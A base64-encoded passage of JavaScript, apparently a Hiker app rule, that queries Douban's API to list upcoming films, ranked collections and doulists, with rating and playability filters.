clxcbiAgICAgICAgfVxcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXCIgKyB0ZW1wLnR5cGUgKyBcXFwiL2NvbWluZ19zb29uXFxcIiArIFxcXCI/YXJlYT1cXFwiICsgdGVtcC5sb2NhbCArIHRlbXAucmFuayArIHRlbXAuYXJlYSArIHRlbXAuZmlsdGVyICsgKHBhZ2UgPyBcXFwiJnN0YXJ0PVxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFwiJmNvdW50PVxcXCIgKyBjb3VudCA6IFxcXCImc3RhcnQ9MCZjb3VudD0xMFxcXCIpKTtcXHJcXG4gICAgbGV0IGwgPSBzLnN1YmplY3RzO1xcclxcbiAgICBsZXQgZGV0YWlsc1ZpZXdDb25maWdzID0gZ2V0Q29uZmlnKCdkZXRhaWxzVmlld0NvbmZpZ3MnKTtcXHJcXG5cXHJcXG4gICAgbGV0IGkgPSBsLm1hcCgoZSA9PiB7XFxyXFxuICAgICAgICBsZXQgdHlwZSA9IGUudHlwZSxcXHJcXG4gICAgICAgICAgICBpZCA9IGUuaWQsXFxyXFxuICAgICAgICAgICAgdGl0bGUgPSBlLnRpdGxlO1xcclxcbiAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxyXFxuICAgICAgICBsZXQgdXJsUGFyYW1zID0ge307XFxyXFxuICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcclxcbiAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcclxcbiAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXCIgKyAnP3R5cGU9JyArIHR5cGUgKyAnJmlkPScgKyBpZCkucnVsZSgodHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcInBsYXlsaXN0XFxcIikge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcclxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbCh1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgcmV0dXJuIHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogdGl0bGUgKyBcXFwi77yIXFxcIiArIGUueWVhciArIFxcXCLvvIlcXFwiLFxcclxcbiAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXHJcXG4gICAgICAgICAgICBleHRyYTogdXJsUGFyYW1zLmV4dHJhLFxcclxcbiAgICAgICAgICAgIGltZzogZS5jb3Zlcl91cmwgKyBcXFwiQFJlZmVyZXI9XFxcIiArIGUuY292ZXJfdXJsLFxcclxcbiAgICAgICAgICAgIGRlc2M6IFxcXCLkuIrmmKDml6XmnJ86XFxcIiArIGUucHViZGF0ZSArIFxcXCJcXFxcblxcXCIgKyBlLndpc2hfY291bnQgKyBcXFwi5Lq65oOz55yLXFxcIiArIFxcXCJcXFxcblxcXCIgKyBlLm51bGxfcmF0aW5nX3JlYXNvblxcclxcbiAgICAgICAgfVxcclxcbiAgICB9KSk7XFxyXFxuXFxyXFxuICAgIHJldHVybiBwYWdlID4gMSA/IGkgOiBhLmNvbmNhdChpKTtcXHJcXG59XFxyXFxuXFxyXFxuLy/niYfljZXor6bmg4VcXHJcXG5mdW5jdGlvbiBzdWJqZWN0Q29sbGVjdGlvbkxpc3QocGFnZSwgY291bnQsIGlkKSB7XFxyXFxuICAgIGlmICghZ2V0TXlWYXIoJ3JhbmtpbmcnKSkgcHV0TXlWYXIoJ3JhbmtpbmcnLCAne1xcXCJpdGVtXFxcIjpcXFwibW92aWVfcmVhbF90aW1lX2hvdGVzdFxcXCIsXFxcInBsYXlhYmxlXFxcIjpcXFwiMFxcXCIsXFxcInNjb3JlXFxcIjpcXFwiMC0xMFxcXCJ9Jyk7XFxyXFxuICAgIGxldCBhID0gW107XFxyXFxuICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncmFua2luZycpKTtcXHJcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcclxcblxcclxcbiAgICBsZXQgaXRlbXMgPSB7XFxyXFxuICAgICAgICDnlLXlvbE6IHtcXHJcXG4gICAgICAgICAgICDlrp7ml7bng63pl6jnlLXlvbE6ICdtb3ZpZV9yZWFsX3RpbWVfaG90ZXN0JyxcXHJcXG4gICAgICAgICAgICDkuIDlkajlj6PnopHnlLXlvbE6ICdtb3ZpZV93ZWVrbHlfYmVzdCcsXFxyXFxuICAgICAgICAgICAgdG9wMjUw55S15b2xOiAnbW92aWVfdG9wMjUwJ1xcclxcbiAgICAgICAgfSxcXHJcXG4gICAgICAgIOeUteinhuWJpzoge1xcclxcbiAgICAgICAgICAgIOWunuaXtueDremXqOWJp+mbhjogJ3R2X3JlYWxfdGltZV9ob3Rlc3QnLFxcclxcbiAgICAgICAgICAgIOWNjuivreWPo+eikeWJp+mbhjogJ3R2X2NoaW5lc2VfYmVzdF93ZWVrbHknLFxcclxcbiAgICAgICAgICAgIOWFqOeQg+WPo+eikeWJp+mbhjogJ3R2X2dsb2JhbF9iZXN0X3dlZWtseSdcXHJcXG4gICAgICAgIH0sXFxyXFxuICAgICAgICDnu7zoibo6IHtcXHJcXG4gICAgICAgICAgICDlm73lhoXlj6PnopHnu7zoibo6ICdzaG93X2NoaW5lc2VfYmVzdF93ZWVrbHknLFxcclxcbiAgICAgICAgICAgIOWbveWkluWPo+eikee7vOiJujogJ3Nob3dfZ2xvYmFsX2Jlc3Rfd2Vla2x5J1xcclxcbiAgICAgICAgfVxcclxcbiAgICB9XFxyXFxuICAgIGZvciAobGV0IGkgaW4gaXRlbXMpIHtcXHJcXG4gICAgICAgIGZvciAobGV0IGogaW4gaXRlbXNbaV0pIHtcXHJcXG4gICAgICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGVtcC5pdGVtID09IGl0ZW1zW2ldW2pdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBqICsgJyA8L2ZvbnQ+PC9iPicgOiBqLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ3JhbmtpbmcnKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLml0ZW0gPSBlO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcInJhbmtpbmdcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgICAgICB9LCBpdGVtc1tpXVtqXSlcXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImJsYW5rX2Jsb2NrXFxcIlxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgY29sX3R5cGU6ICdibGFua19ibG9jaydcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IGkgPSBbXTtcXHJcXG4gICAgbGV0IHBsYXlhYmxlID0ge1xcclxcbiAgICAgICAg5YWo6YOo5b2x54mHOiAnMCcsXFxyXFxuICAgICAgICDku4XmnInniYfmupA6ICcxJ1xcclxcbiAgICB9XFxyXFxuICAgIGZvciAobGV0IHIgaW4gcGxheWFibGUpIHtcXHJcXG4gICAgICAgIGkucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAucGxheWFibGUgPT0gcGxheWFibGVbcl0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIHIgKyAnIDwvZm9udD48L2I+JyA6IHIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ3JhbmtpbmcnKSk7XFxyXFxuICAgICAgICAgICAgICAgIHRlbXAucGxheWFibGUgPSBlO1xcclxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwicmFua2luZ1xcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0sIHBsYXlhYmxlW3JdKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBpLnB1c2goe1xcclxcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz7or4TliIbljLrpl7Q6JyArIHRlbXAuc2NvcmUgKyAnIDwvZm9udD48L2I+JyxcXHJcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICB1cmw6ICQodGVtcC5zY29yZSwgJ+ivhOWIhuW6lOWcqDAtMTDkuYvpl7QnKS5pbnB1dCgoKSA9PiB7XFxyXFxuICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdyYW5raW5nJykpO1xcclxcbiAgICAgICAgICAgIGxldCBpbnB1dHMgPSBpbnB1dC5zcGxpdCgnLScpO1xcclxcbiAgICAgICAgICAgIGlmIChpbnB1dHMubGVuZ3RoID09IDIgJiYgaW5wdXRzLmV2ZXJ5KGUgPT4gZSA+PSAwICYmIGUgPD0gMTApICYmIHBhcnNlRmxvYXQoaW5wdXRzWzBdKSA8IGlucHV0c1sxXSkge1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLnNjb3JlID0gaW5wdXQ7XFxyXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJyYW5raW5nXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+ivt+ato+ehrui+k+WFpSdcXHJcXG4gICAgICAgICAgICB9XFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9KVxcclxcblxcclxcbiAgICBsZXQgdCA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9zdWJqZWN0X2NvbGxlY3Rpb24vXFxcIiArIChpZCB8fCB0ZW1wLml0ZW0pKTtcXHJcXG4gICAgaS5wdXNoKHtcXHJcXG4gICAgICAgIHRpdGxlOiB0LnRpdGxlICsgJyjlhbEnICsgdC50b3RhbCArICfpg6gpJyxcXHJcXG4gICAgICAgIGRlc2M6IHQuZGVzY3JpcHRpb24sXFxyXFxuICAgICAgICAvKmltZzogdC5oZWFkZXJfYmdfaW1hZ2UgKyBcXFwiQFJlZmVyZXI9XFxcIiArIHQuaGVhZGVyX2JnX2ltYWdlLFxcclxcbiAgICAgICAgdXJsOiB0LmhlYWRlcl9iZ19pbWFnZSArIFxcXCI/dHlwZT0uanBnQFJlZmVyZXI9XFxcIiArIHQuaGVhZGVyX2JnX2ltYWdlICsgXFxcIj90eXBlPS5qcGdcXFwiLCovXFxyXFxuICAgICAgICB1cmw6ICd0b2FzdDovL+eCueaIkeW5suWYmycsXFxyXFxuICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvc3ViamVjdF9jb2xsZWN0aW9uL1xcXCIgKyAoaWQgfHwgdGVtcC5pdGVtKSArIFxcXCIvaXRlbXM/XFxcIiArIChwYWdlID8gXFxcInN0YXJ0PVxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFwiJmNvdW50PVxcXCIgKyBjb3VudCA6IFxcXCJzdGFydD0wJmNvdW50PTUwXFxcIikpO1xcclxcbiAgICBsZXQgbCA9IHMuc3ViamVjdF9jb2xsZWN0aW9uX2l0ZW1zO1xcclxcbiAgICBpZiAodGVtcC5wbGF5YWJsZSA9PSAnMScpIGwgPSBsLmZpbHRlcihlID0+ICEhZS5oYXNfbGluZXdhdGNoKTtcXHJcXG4gICAgaWYgKHRlbXAuc2NvcmUgIT0gJzAtMTAnKSB7XFxyXFxuICAgICAgICBsID0gbC5maWx0ZXIoZSA9PiB7XFxyXFxuICAgICAgICAgICAgbGV0IHIgPSB0ZW1wLnNjb3JlLnNwbGl0KCctJyk7XFxyXFxuICAgICAgICAgICAgcmV0dXJuIGUucmF0aW5nICYmIGUucmF0aW5nLnZhbHVlIDwgclsxXSAmJiBlLnJhdGluZy52YWx1ZSA+IHJbMF07XFxyXFxuICAgICAgICB9KTtcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBsZXQgZGV0YWlsc1ZpZXdDb25maWdzID0gZ2V0Q29uZmlnKCdkZXRhaWxzVmlld0NvbmZpZ3MnKTtcXHJcXG4gICAgbGV0IHIgPSBsLm1hcCgoZSA9PiB7XFxyXFxuICAgICAgICBsZXQgdHlwZSA9IGUudHlwZSxcXHJcXG4gICAgICAgICAgICBpZCA9IGUuaWQsXFxyXFxuICAgICAgICAgICAgdGl0bGUgPSBlLnRpdGxlO1xcclxcbiAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxyXFxuICAgICAgICBsZXQgdXJsUGFyYW1zID0ge307XFxyXFxuICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcclxcbiAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcclxcbiAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXCIgKyAnP3R5cGU9JyArIHR5cGUgKyAnJmlkPScgKyBpZCkucnVsZSgodHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcInBsYXlsaXN0XFxcIikge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcclxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbCh1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgcmV0dXJuIHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX3ZlcnRpY2FsX3BpYycsXFxyXFxuICAgICAgICAgICAgdXJsOiB1cmxQYXJhbXMudXJsLFxcclxcbiAgICAgICAgICAgIGV4dHJhOiB1cmxQYXJhbXMuZXh0cmEsXFxyXFxuICAgICAgICAgICAgaW1nOiBlLnBpYy5ub3JtYWwgKyBcXFwiQFJlZmVyZXI9XFxcIiArIGUucGljLm5vcm1hbCxcXHJcXG4gICAgICAgICAgICBkZXNjOiBlLmNhcmRfc3VidGl0bGUuc3BsaXQoXFxcIi9cXFwiKS5maWx0ZXIoKChlLCB0KSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGlmICh0IDwgMykgcmV0dXJuIGVcXHJcXG4gICAgICAgICAgICB9KSkuam9pbihcXFwiLFxcXCIpICsgXFxcIlxcXFxuXFxcIiArIChlLnJhdGluZyA/IGNvbXB1dGVSYXRpbmcoZS5yYXRpbmcubWF4LCBlLnJhdGluZy52YWx1ZSkgKyBcXFwiIFxcXCIgKyBlLnJhdGluZy52YWx1ZS50b0ZpeGVkKDEpICsgXFxcIuWIhlxcXCIgOiBcXFwi5pqC5peg6K+E5YiGXFxcIilcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfSkpO1xcclxcblxcclxcbiAgICBzZXRIb21lUmVzdWx0KHtcXHJcXG4gICAgICAgIGRhdGE6IHBhZ2UgPiAxID8gciA6IChpZCA/IGkuY29uY2F0KHIpIDogYS5jb25jYXQoaSkuY29uY2F0KHIpKVxcclxcbiAgICB9KVxcclxcbn1cXHJcXG5cXHJcXG4vL+ixhuWIl+ivpuaDhVxcclxcbmZ1bmN0aW9uIGRvdUxpc3QoaWQsIHBhZ2UsIGNvdW50KSB7XFxyXFxuICAgIGFkZExpc3RlbmVyKCdvbkNsb3NlJywgJ2NsZWFyTXlWYXIoXFxcImRvdUxpc3RcXFwiKScpO1xcclxcbiAgICBpZiAoIWdldE15VmFyKCdkb3VMaXN0JykpIHB1dE15VmFyKCdkb3VMaXN0JywgJ3tcXFwicGxheWFibGVcXFwiOlxcXCIwXFxcIixcXFwic2NvcmVcXFwiOlxcXCIwLTEwXFxcIn0nKTtcXHJcXG4gICAgbGV0IGkgPSBbXTtcXHJcXG4gICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdkb3VMaXN0JykpO1xcclxcbiAgICBsZXQgY29sb3IgPSBnZXRDb25maWcoJ2Nob29zZUNvbG9yJyk7XFxyXFxuXFxyXFxuICAgIGxldCBwbGF5YWJsZSA9IHtcXHJcXG4gICAgICAgIOWFqOmDqOW9seeJhzogJzAnLFxcclxcbiAgICAgICAg5LuF5pyJ54mH5rqQOiAnMSdcXHJcXG4gICAgfVxcclxcbiAgICBmb3IgKGxldCByIGluIHBsYXlhYmxlKSB7XFxyXFxuICAgICAgICBpLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnBsYXlhYmxlID09IHBsYXlhYmxlW3JdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyByICsgJyA8L2ZvbnQ+PC9iPicgOiByLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjogLy9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdkb3VMaXN0JykpO1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLnBsYXlhYmxlID0gZTtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImRvdUxpc3RcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXHJcXG4gICAgICAgICAgICB9LCBwbGF5YWJsZVtyXSlcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgaS5wdXNoKHtcXHJcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6K+E5YiG5Yy66Ze0OicgKyB0ZW1wLnNjb3JlICsgJyA8L2ZvbnQ+PC9iPicsXFxyXFxuICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgdXJsOiAkKHRlbXAuc2NvcmUsICfor4TliIblupTlnKgwLTEw5LmL6Ze0JykuaW5wdXQoKCkgPT4ge1xcclxcbiAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignZG91TGlzdCcpKTtcXHJcXG4gICAgICAgICAgICBsZXQgaW5wdXRzID0gaW5wdXQuc3BsaXQoJy0nKTtcXHJcXG4gICAgICAgICAgICBpZiAoaW5wdXRzLmxlbmd0aCA9PSAyICYmIGlucHV0cy5ldmVyeShlID0+IGUgPj0gMCAmJiBlIDw9IDEwKSAmJiBwYXJzZUZsb2F0KGlucHV0c1swXSkgPCBpbnB1dHNbMV0pIHtcXHJcXG4gICAgICAgICAgICAgICAgdGVtcC5zY29yZSA9IGlucHV0O1xcclxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiZG91TGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxyXFxuICAgICAgICAgICAgfVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IHQgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvZG91bGlzdC9cXFwiICsgaWQpO1xcclxcbiAgICBpLnB1c2goe1xcclxcbiAgICAgICAgdGl0bGU6IHQudGl0bGUsXFxyXFxuICAgICAgICBkZXNjOiAn5YWxJyArIHQuaXRlbXNfY291bnQgKyAn6YOoKCcgKyB0LnBsYXlhYmxlX2NvdW50ICsgJ+mDqOWPr+aSreaUviknLFxcclxcbiAgICAgICAgLyppbWc6IHQuaGVhZGVyX2JnX2ltYWdlICsgXFxcIkBSZWZlcmVyPVxcXCIgKyB0LmhlYWRlcl9iZ19pbWFnZSxcXHJcXG4gICAgICAgIHVybDogdC5oZWFkZXJfYmdfaW1hZ2UgKyBcXFwiP3R5cGU9LmpwZ0BSZWZlcmVyPVxcXCIgKyB0LmhlYWRlcl9iZ19pbWFnZSArIFxcXCI/dHlwZT0uanBnXFxcIiwqL1xcclxcbiAgICAgICAgdXJsOiAndG9hc3Q6Ly/liKvngrnmiJEnLFxcclxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxyXFxuICAgIH0pO1xcclxcblxcclxcbiAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9kb3VsaXN0L1xcXCIgKyBpZCArIFxcXCIvcG9zdHNcXFwiICsgJz9wbGF5YWJsZT0nICsgdGVtcC5wbGF5YWJsZSArIChwYWdlID8gXFxcIiZzdGFydD1cXFwiICsgKHBhZ2UgLSAxKSAqIGNvdW50ICsgXFxcIiZjb3VudD1cXFwiICsgY291bnQgOiBcXFwiJnN0YXJ0PTAmY291bnQ9NTBcXFwiKSk7XFxyXFxuICAgIGxldCBsID0gcy5pdGVtcztcXHJcXG4gICAgaWYgKHRlbXAuc2NvcmUgIT0gJzAtMTAnKSB7XFxyXFxuICAgICAgICBsID0gbC5maWx0ZXIoZSA9PiB7XFxyXFxuICAgICAgICAgICAgbGV0IHIgPSB0ZW1wLnNjb3JlLnNwbGl0KCctJyk7XFxyXFxuICAgICAgICAgICAgcmV0dXJuIGUuY29udGVudC5zdWJqZWN0LnJhdGluZyAmJiBlLmNvbnRlbnQuc3ViamVjdC5yYXRpbmcudmFsdWUgPCByWzFdICYmIGUuY29udGVudC5zdWJqZWN0LnJhdGluZy52YWx1ZSA+IHJbMF07XFxyXFxuICAgICAgICB9KTtcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBsZXQgZGV0YWlsc1ZpZXdDb25maWdzID0gZ2V0Q29uZmlnKCdkZXRhaWxzVmlld0NvbmZpZ3MnKTtcXHJcXG4gICAgbGV0IHIgPSBsLm1hcCgoZSA9PiB7XFxyXFxuICAgICAgICBsZXQgdHlwZSA9IGUuY29udGVudC5zdWJqZWN0LnR5cGUsXFxyXFxuICAgICAgICAgICAgaWQgPSBlLmNvbnRlbnQuc3ViamVjdC5pZCxcXHJcXG4gICAgICAgICAgICB0aXRsZSA9IGUuY29udGVudC5zdWJqZWN0LnRpdGxlO1xcclxcbiAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxyXFxuICAgICAgICBsZXQgdXJsUGFyYW1zID0ge307XFxyXFxuICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcclxcbiAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcclxcbiAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXCIgKyAnP3R5cGU9JyArIHR5cGUgKyAnJmlkPScgKyBpZCkucnVsZSgodHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcInBsYXlsaXN0XFxcIikge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcclxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbCh1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgcmV0dXJuIHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxyXFxuICAgICAgICAgICAgdXJsOiB1cmxQYXJhbXMudXJsLFxcclxcbiAgICAgICAgICAgIGV4dHJhOiB1cmxQYXJhbXMuZXh0cmEsXFxyXFxuICAgICAgICAgICAgaW1nOiBlLmNvbnRlbnQuc3ViamVjdC5waWMubm9ybWFsICsgXFxcIkBSZWZlcmVyPVxcXCIgKyBlLmNvbnRlbnQuc3ViamVjdC5waWMubm9ybWFsLFxcclxcbiAgICAgICAgICAgIGRlc2M6IGUuY29udGVudC5zdWJqZWN0LmNhcmRfc3VidGl0bGUuc3BsaXQoXFxcIi9cXFwiKS5maWx0ZXIoKChlLCB0KSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGlmICh0IDwgMykgcmV0dXJuIGVcXHJcXG4gICAgICAgICAgICB9KSkuam9pbihcXFwiLFxcXCIpICsgXFxcIlxcXFxuXFxcIiArIChlLmNvbnRlbnQuc3ViamVjdC5yYXRpbmcgPyBjb21wdXRlUmF0aW5nKGUuY29udGVudC5zdWJqZWN0LnJhdGluZy5tYXgsIGUuY29udGVudC5zdWJqZWN0LnJhdGluZy52YWx1ZSkgKyBcXFwi